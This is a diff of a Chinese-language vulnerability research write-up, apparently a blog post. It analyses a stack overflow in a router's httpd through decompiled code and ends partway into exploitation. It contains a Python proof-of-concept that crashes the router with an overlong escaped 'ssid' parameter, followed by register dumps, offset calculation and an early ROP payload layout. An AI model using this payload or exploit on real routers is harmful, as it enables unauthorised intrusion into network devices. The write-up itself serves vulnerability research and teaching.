+       <span class="p">}</span>
+       <span class="k">return</span> <span class="n">index</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="n">stringModify</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+</code></pre></div>
+通过分析这个函数，我们可以知道这个函数是用来转义/过滤一些特殊字符，函数处理的整个过程为：</p>
+<p>1 . 对<code>\，/，&lt;，&gt;，"</code>这些符号进行转义
+2 . 把单独的\r或者\n（单独是指后面没有跟\r或者\n）
+3 . 差不多相当于字符串拷贝，只是拷贝的同时对一些字符进行了处理
+4 . 原本一个字节的\n会被转义成四个字节的\<br> 很容易dst设置大小不够造成溢出</p>
+<p>通过函数交叉引用进行回溯，可以找到 <code>writePageParamSet</code> 函数，这是它的一个调用者，设置dst缓冲区太小造成溢出。</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">writePageParamSet</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_2</span><span class="p">,</span><span class="kt">int</span> <span class="o">**</span><span class="n">param_3</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_4</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="o">*</span><span class="n">piVar2</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_210</span> <span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">param_3</span> <span class="o">==</span> <span class="p">(</span><span class="kt">int</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">param_4</span> <span class="o">=</span> <span class="mh">0xb2</span><span class="p">;</span>
+    <span class="n">HTTP_DEBUG_PRINT</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">,&quot;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">stringModify</span><span class="p">(</span><span class="n">local_210</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_3</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;string modify error!&quot;</span><span class="p">);</span>
+      <span class="n">local_210</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">piVar2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">local_210</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">piVar2</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_3</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">httpPrintf</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">,</span><span class="n">piVar2</span><span class="p">,</span><span class="n">param_4</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>继续往前回溯，找到 <code>0x0457574</code>地址处的函数，这个函数获取get请求的一些参数，调用了漏洞函数：
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">UndefinedFunction_00457574</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_2</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">param_3</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_4</span><span class="p">)</span>
+
+<span class="p">{</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;ssid&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">uStack3080</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">__n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s_00</span><span class="p">);</span>
+      <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">uStack3080</span><span class="p">,</span><span class="n">__s_00</span><span class="p">,</span><span class="n">__n</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;curRegion&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">piStack3044</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x11</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__s</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x6c</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">piStack3044</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;channel&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">piStack3040</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x6</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">__s</span> <span class="o">-</span> <span class="mi">1U</span> <span class="o">&lt;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">piStack3040</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;chanWidth&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">piStack3036</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x2</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">__s</span> <span class="o">-</span> <span class="mi">1U</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">piStack3036</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;mode&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">piStack3032</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">__s</span> <span class="o">-</span> <span class="mi">1U</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">piStack3032</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;wrr&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">__s_00</span><span class="p">,</span><span class="s">&quot;true&quot;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">),</span> <span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">piStack3028</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">piStack3028</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;sb&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">__s_00</span><span class="p">,</span><span class="s">&quot;true&quot;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">),</span> <span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">piStack3024</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">piStack3024</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;select&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">__s_00</span><span class="p">,</span><span class="s">&quot;true&quot;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">),</span> <span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">piStack3020</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">piStack3020</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">httpGetEnv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;rate&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__s_00</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iStack3016</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">__s_00</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">httpPrintf</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span>
+               <span class="s">&quot;&lt;SCRIPT language=</span><span class="se">\&quot;</span><span class="s">javascript</span><span class="se">\&quot;</span><span class="s"> type=</span><span class="se">\&quot;</span><span class="s">text/javascript</span><span class="se">\&quot;</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">var %s = new Array(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+               <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="s">&quot;pagePara&quot;</span><span class="p">,</span><span class="n">uVar11</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">uStack3080</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3044</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3040</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3036</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3032</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3028</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3024</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;%d,&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">piStack3020</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+    <span class="n">__s</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">iStack3016</span><span class="p">;</span>
+    <span class="n">uVar12</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">writePageParamSet</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="mh">0x548278</span><span class="p">);</span>
+    <span class="n">httpPrintf</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;0,0 );</span><span class="se">\n</span><span class="s">&lt;/SCRIPT&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">__s</span><span class="p">,</span><span class="n">uVar12</span><span class="p">);</span>
+    <span class="n">httpPrintf</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;&lt;script language=JavaScript&gt;</span><span class="se">\n</span><span class="s">var isInScanning = 0;</span><span class="se">\n</span><span class="s">&lt;/script&gt;&quot;</span><span class="p">,</span><span class="n">__s</span><span class="p">,</span><span class="n">uVar12</span><span class="p">);</span>
+    <span class="n">uVar9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">HttpWebV4Head</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">uVar12</span><span class="p">);</span>
+    <span class="n">__s_00</span> <span class="o">=</span> <span class="s">&quot;/userRpm/WzdWlanSiteSurveyRpm_AP.htm&quot;</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></p>
+<h2 id="0x03">0x03 漏洞验证<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
+<p>写了一个 poc 来验证一下：</p>
+<p><div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">socks</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="n">SOCKS5_PROXY_HOST</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span> <span class="c1"># socks 代 理 IP地 址 是 用 ssh -D进 行 端 口 转 发 ， 需 要 设 置</span>
+<span class="n">代</span> <span class="n">理</span>
+<span class="n">SOCKS5_PROXY_PORT</span> <span class="o">=</span> <span class="mi">9999</span> <span class="c1"># socks 代 理 本 地 端 口</span>
+
+<span class="n">default_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span>
+<span class="n">socks</span><span class="o">.</span><span class="n">set_default_proxy</span><span class="p">(</span><span class="n">socks</span><span class="o">.</span><span class="n">SOCKS5</span><span class="p">,</span> <span class="n">SOCKS5_PROXY_HOST</span><span class="p">,</span> <span class="n">SOCKS5_PROXY_PORT</span><span class="p">)</span>
+<span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">socks</span><span class="o">.</span><span class="n">socksocket</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">session</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="n">cookie</span><span class="p">):</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36</span>
+<span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">80.0</span><span class="o">.</span><span class="mf">3987.149</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span><span class="s2">&quot;,</span>
+                <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span><span class="s2">&quot;Authorization=Basic</span><span class="si">{cookie}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cookie</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">cookie</span><span class="p">))}</span>
+
+    <span class="n">payload</span><span class="o">=</span><span class="s2">&quot;/%0A&quot;</span><span class="o">*</span><span class="mh">0x55</span> <span class="o">+</span> <span class="s2">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;</span>
+
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;mode&quot;</span><span class="p">:</span><span class="s2">&quot;1000&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;curRegion&quot;</span><span class="p">:</span><span class="s2">&quot;1000&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;chanWidth&quot;</span><span class="p">:</span><span class="s2">&quot;100&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;channel&quot;</span><span class="p">:</span><span class="s2">&quot;1000&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;ssid&quot;</span><span class="p">:</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="n">url</span><span class="o">=</span><span class="s2">&quot;http://172.17.221.20:80/</span><span class="si">{path}</span><span class="s2">/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span><span class="o">.</span><span class="k">for</span>  <span class="n">mat</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+
+
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">exp</span><span class="p">(</span><span class="s2">&quot;TFDTDFTCUJPCWNEB&quot;</span><span class="p">,</span><span class="s2">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span><span class="p">)</span>
+</code></pre></div>
+使用 wireshark 抓包，查看发送的数据包，也可以使用 burp 抓包：</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20200413110020662.png" /></p>
+<ul>
+<li>注意这里的 ssid 里的内容需要加上 <code>unquote</code> 函数对 %0A 先进行解码，因为 python requests 发送数据包时会默认对参数值进行编码。</li>
+</ul>
+<p>结果会发现远程路由器服务崩溃，gdbserver 抛出了 SIGSEGV 的栈溢出信号。</p>
+<p><img alt="" src="http://static.zybuluo.com/H4l0/hhqhr7osmb3zrcm6rcv6dgav/image.png" /></p>
+<h2 id="0x04">0x04 漏洞利用<a class="headerlink" href="#0x04" title="Permanent link">&para;</a></h2>
+<h3 id="mipsrop-rop">使用 mipsrop 插件查找 ROP<a class="headerlink" href="#mipsrop-rop" title="Permanent link">&para;</a></h3>
+<p>崩溃之后，查看上下文环境，查看 pc 寄存器的值确定偏移：</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20200413110250233.png" /></p>
+<p><div class="codehilite"><pre><span></span><code>$t6 : 0x61636661 (&quot;afca&quot;?)   (a*218+t6)
+$t7 : 0x0
+$s0 : 0x61616261 (&quot;abaa&quot;?)，实际上是大端，应该是aaba（a*2+s0）
+$s1 : 0x61616361 (&quot;acaa&quot;?) (a*6+s1)
+$s2 : 0x61616461 (&quot;adaa&quot;?)
+$s3 : 0x5
+$s4 : 0x0
+$s5 : 0x7
+$s6 : 0x0
+$s7 : 0x0064d6bc → 0x0064e7f4 → 0x000a0003
+$t8 : 0x2
+$t9 : 0x77faf980 → 0x3c1c0002
+$k0 : 0x0
+$k1 : 0x0
+$s8 : 0x7d7fedf8 → &quot;abwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaac[...]&quot;
+$pc : 0x61616561 (&quot;aeaa&quot;?)
+$sp : 0x7d7fed50 → &quot;aafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa[...]&quot;
+$hi : 0x36c67
+$lo : 0x6338ceeb
+$fir : 0x739300
+$ra : 0x61616561 (&quot;aeaa&quot;?)
+$gp : 0x00594d80 → 0x00000000
+</code></pre></div>
+计算得出偏移：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">sp的偏移为</span> <span class="s">&quot;/%0A&quot;</span><span class="o">*</span><span class="mh">0x55</span><span class="o">+</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s">&quot;aaaa&quot;</span><span class="o">*</span><span class="mi">4</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="s">&quot;/%0A&quot;</span><span class="o">*</span><span class="mh">0x55</span><span class="o">+</span><span class="err">“</span><span class="n">a</span><span class="err">”</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">s0</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">s1</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">s2</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">pc</span><span class="p">,</span><span class="n">ra</span>
+</code></pre></div>
+
+<p><div class="codehilite"><pre><span></span><code>gef➤ vmmap
+<span class="o">[</span> Legend: Code <span class="p">|</span> Heap <span class="p">|</span> Stack <span class="o">]</span>
+Start End Offset Perm Path
+0x00400000 0x00561000 0x00000000 r-x /usr/bin/httpd
+0x00571000 0x00590000 0x00161000 rw- /usr/bin/httpd
+0x00590000 0x0066e000 0x00000000 rwx <span class="o">[</span>heap<span class="o">]</span>
